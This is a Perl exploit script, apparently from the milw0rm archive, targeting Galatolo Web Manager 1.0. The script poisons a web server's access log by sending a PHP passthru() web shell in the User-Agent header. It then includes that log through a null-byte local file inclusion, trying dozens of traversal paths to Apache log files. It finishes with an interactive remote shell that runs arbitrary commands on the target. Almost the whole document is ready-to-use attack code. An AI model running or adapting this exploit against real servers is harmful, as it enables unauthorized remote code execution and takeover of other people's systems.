<html><head><title>Galatolo Web Manager 1.0 XSS / Local File Inclusion Vulnerability</title></head><pre>#!/usr/bin/perl 
# Galatolo Web Manager 1.0 Remote Command Execution Exploit
# by yeat - staker[at]hotmail[dot]it

use IO::Socket;
use LWP::UserAgent;

my ($lwp,$response) = new LWP::UserAgent;
my ($host,$path) = @ARGV;


if (@ARGV != 2) {
   print &quot;Galatolo Web Manager 1.0 Remote Command Execution Exploit\n&quot;;
   print &quot;by yeat - staker[at]hotmail[dot]it\n&quot;;
   print &quot;Usage: perl $0 [host] [path]\n&quot;;
   exit;
}  

inject_log();
shell_exec();


                                  
sub log_path
{
     my $path = undef;
    
     my @logs = (
          &quot;../../../../../var/log/httpd/access_log&quot;, 
          &quot;../../../../../var/log/httpd/error_log&quot;,
          &quot;../apache/logs/error.log&quot;,
          &quot;../apache/logs/access.log&quot;,
          &quot;../../apache/logs/error.log&quot;,
          &quot;../../apache/logs/access.log&quot;,
          &quot;../../../apache/logs/error.log&quot;,
          &quot;../../../apache/logs/access.log&quot;,
          &quot;../../../../apache/logs/error.log&quot;,
          &quot;../../../../apache/logs/access.log&quot;,
          &quot;../../../../../apache/logs/error.log&quot;,
          &quot;../../../../../apache/logs/access.log&quot;,
          &quot;../logs/error.log&quot;,
          &quot;../logs/access.log&quot;,
          &quot;../../logs/error.log&quot;,
          &quot;../../logs/access.log&quot;,
          &quot;../../../logs/error.log&quot;,
          &quot;../../../logs/access.log&quot;,
          &quot;../../../../logs/error.log&quot;,
          &quot;../../../../logs/access.log&quot;,
          &quot;../../../../../logs/error.log&quot;,
          &quot;../../../../../logs/access.log&quot;,
          &quot;../../../../../etc/httpd/logs/access_log&quot;,
          &quot;../../../../../etc/httpd/logs/access.log&quot;,
          &quot;../../../../../etc/httpd/logs/error_log&quot;,
          &quot;../../../../../etc/httpd/logs/error.log&quot;,
          &quot;../../.. /../../var/www/logs/access_log&quot;,
          &quot;../../../../../var/www/logs/access.log&quot;,
          &quot;../../../../../usr/local/apache/logs/access_log&quot;,
          &quot;../../../../../usr/local/apache/logs/access.log&quot;,
          &quot;../../../../../var/log/apache/access_log&quot;,
          &quot;../../../../../var/log/apache/access.log&quot;,
          &quot;../../../../../var/log/access_log&quot;,
          &quot;../../../../../var/www/logs/error_log&quot;,
          &quot;../../../../../var/www/logs/error.log&quot;,
          &quot;../../../../../var/log/apache2/error.log&quot;,
          &quot;../../../../../var/log/apache2/access.log&quot;,
          &quot;../../../../../usr/local/apache/logs/error_log&quot;,
          &quot;../../../../../usr/local/apache/logs/error.log&quot;,
          &quot;../../../../../var/log/apache/error_log&quot;,
          &quot;../../../../../var/log/apache/error.log&quot;,
          &quot;../../../../../var/log/access_log&quot;,
          &quot;../../../../../var/log/error_log&quot;
     );
     
     $lwp-&gt;agent('Lynx (textmode)');
     
     for (my $i=0;$i&lt;=$#logs;$i++) {
        $response = $lwp-&gt;get(&quot;http://$host/$path/index.php?cmd=echo '&lt;yeatr0x&gt;';&amp;com=${logs[$i]}%00&quot;);; 
        
        if ($response-&gt;content =~ m/&lt;yeatr0x&gt;/i) {
           $path = $logs[$i];
           break;
        }    
    }      return $path;                     
}   


sub shell_exec
{
     my $log = log_path();
     my $nos = &quot;echo '&lt;lulz&gt;'&quot;;
     
     $lwp-&gt;agent('Lynx (textmode)');
     
      while (1) {
         print &quot;\n[shell]~# &quot;;
         chomp($cmd = &lt;STDIN&gt;);
     
         if ($cmd !~ /^(exit|exit--|--exit)$/i) {
            $response = $lwp-&gt;get(&quot;http://$host/$path/index.php?cmd=$nos;$cmd;$nos;&amp;com=$log%00&quot;);
           
            if ($response-&gt;content =~ /&lt;lulz&gt;*/i) { 
               @split = split('&lt;lulz&gt;',$response-&gt;content);
               print $split[1];
            }     
        }   
        else {
           die &quot;Exited.&quot;;
        }   
    }      
}         


sub inject_log
{
     my $header = undef;
     my $xploit = &quot;lulz&lt;?php passthru(stripslashes(\$_GET['cmd'])); exit; ?&gt;&quot;; 
     my $socket = new IO::Socket::INET (
                                         PeerAddr =&gt; $host,
                                         PeerPort =&gt; 80,
                                         Proto    =&gt; 'tcp',
                                      ) or die $!;
     
     $header .= &quot;GET / HTTP/1.1\r\n&quot;;
     $header .= &quot;Host: $host\r\n&quot;;
     $header .= &quot;User-Agent: $xploit\r\n&quot;;
     $header .= &quot;Connection: close\r\n\r\n&quot;;
     
     return $socket-&gt;send($header);
}

# milw0rm.com [2008-06-08]</pre></html>